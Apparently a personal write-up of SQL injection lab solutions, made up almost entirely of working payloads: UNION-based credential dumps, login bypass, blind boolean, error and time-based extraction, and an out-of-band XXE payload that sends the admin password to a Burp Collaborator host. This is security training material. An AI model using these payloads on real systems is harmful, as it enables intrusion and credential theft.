# SQL injection

## Retrieving hidden data

### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
```
/filter?category=Food+%26+Drink'+OR+1=1--
```

## Subverting application logic

### SQL injection vulnerability allowing login bypass

Username: `administrator'--`

## Retrieving data from other database tables

### Determining the number of columns required in an SQL injection UNION attack
```
?category=Gifts'+UNION+SELECT+null--            500 Internal Server Error
?category=Gifts'+UNION+SELECT+null,null--       500 Internal Server Error
?category=Gifts'+UNION+SELECT+null,null,null--  200 OK
```

### Finding columns with a useful data type in an SQL injection UNION attack
```
?category=Gifts'+UNION+SELECT+'rn4IRy',null,null--   500 Internal Server Error
?category=Gifts'+UNION+SELECT+null,'rn4IRy',null--   200 OK
```

### Using an SQL injection UNION attack to retrieve interesting data
```
?category=Pets'+UNION+SELECT+username,password+FROM+users--
```
Credentials retrieved: `administrator` / `sip8ds`

### Retrieving multiple values within a single column
```
?category=Gifts'+UNION+SELECT+null,username+||+'~'+||+password+FROM+users--

wiener~peter
administrator~5v82nt
carlos~montoya
```

## Examining the database

### SQL injection attack, querying the database type and version on Oracle
```
?category=Gifts'+UNION+SELECT+BANNER,null+FROM+v$version--
```

### SQL injection attack, querying the database type and version on MySQL and Microsoft
```
?category=Lifestyle'+UNION+SELECT+null,@@version--+
```

### SQL injection attack, listing the database contents on non-Oracle databases
```
?category=Gifts%27+UNION+SELECT+version(),null--+
PostgreSQL 11.2 (Debian 11.2-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit

?category=Gifts%27+UNION+SELECT+TABLE_SCHEMA,TABLE_NAME+FROM+information_schema.tables--+
public / users_xsxvki

?category=Gifts%27+UNION+SELECT+null,COLUMN_NAME+FROM+information_schema.columns+WHERE+table_name=%27users_xsxvki%27--+
username_difdky
password_gjwzbs

?category=Gifts%27+UNION+SELECT+username_difdky,password_gjwzbs+FROM+users_xsxvki--+
administrator / niuv95
```

### SQL injection attack, listing the database contents on Oracle
```
https://docs.oracle.com/cd/B19306_01/server.102/b14237/statviews_2105.htm#REFRN20286
?category=Gifts%27+UNION+SELECT+null,TABLE_NAME+FROM+all_tables--
USERS_TUEJNQ

https://docs.oracle.com/cd/B19306_01/server.102/b14237/statviews_2094.htm
?category=Gifts%27+UNION+SELECT+null,COLUMN_NAME+FROM+all_tab_columns+WHERE+TABLE_NAME=%27USERS_TUEJNQ%27--
USERNAME_GIBQLT
PASSWORD_EZJBQY

?category=Gifts%27+UNION+SELECT+USERNAME_GIBQLT,PASSWORD_EZJBQY+FROM+USERS_TUEJNQ--+
administrator / lpm52k
```

## Blind SQL injection vulnerabilities

### Blind SQL injection with conditional responses

Determine password length:
```
TrackingId=a'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)=6--;
```

Use Burp Suite Intruder (payload Brute-force `a-z0-9`) to get password one character at a time.
If the server response contains `Welcome back` then we know we guessed the character correctly.
```
TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,1,1)='§a§'--;
TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,2,1)='§a§'--;
TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,3,1)='§a§'--;
...
```
Password is: `nqk8kg`

### Blind SQL injection with conditional errors

Determine password length:
```
TrackingId=x'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+length(password)>6)+THEN+to_char(1/0)+ELSE+null+END+FROM+users--;
```

Use Burp Suite Intruder to get password one character at a time.
If the server responds with HTTP 500 then we know we guessed the character correctly.
This time I used attack type `Cluster bomb` and set 2 payloads right away - the first payload was a simple
number iterator and the second payload was Brute-force `a-z0-9`.
```
TrackingId=x'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTR(password,§1§,1)='§a§')+THEN+to_char(1/0)+ELSE+null+END+FROM+users--;
```
Password is: `2req0w`

### Blind SQL injection with time delays
```
TrackingId=x'||pg_sleep(10)--
```

### Blind SQL injection with time delays and information retrieval

Determine password length:
```
TrackingId=a'%3bselect+case+when+(username='administrator'+and+length(password)=6)+then+pg_sleep(5)+else+null+end+from+users--;
```

Use Burp Suite Intruder to get password one character at a time.
If the server responds in more than 10 secs then we know guessed the character correctly.
```
TrackingId=a'%3bselect+case+when+(username='administrator'+and+substring(password,§1§,1)='§a§')+then+pg_sleep(10)+else+null+end+from+users--;
```

Password is: `2req0w`
```
bu15v4
```

### Blind SQL injection with out-of-band interaction

```
TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//x.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
```

### Blind SQL injection with out-of-band data exfiltration
```
TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.ttqw3(...).burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--;
```
Burp Collaborator interaction: `gd61dj.ttqw3gbwcea26g1r6yl4nup1lsrif7.burpcollaborator.net.`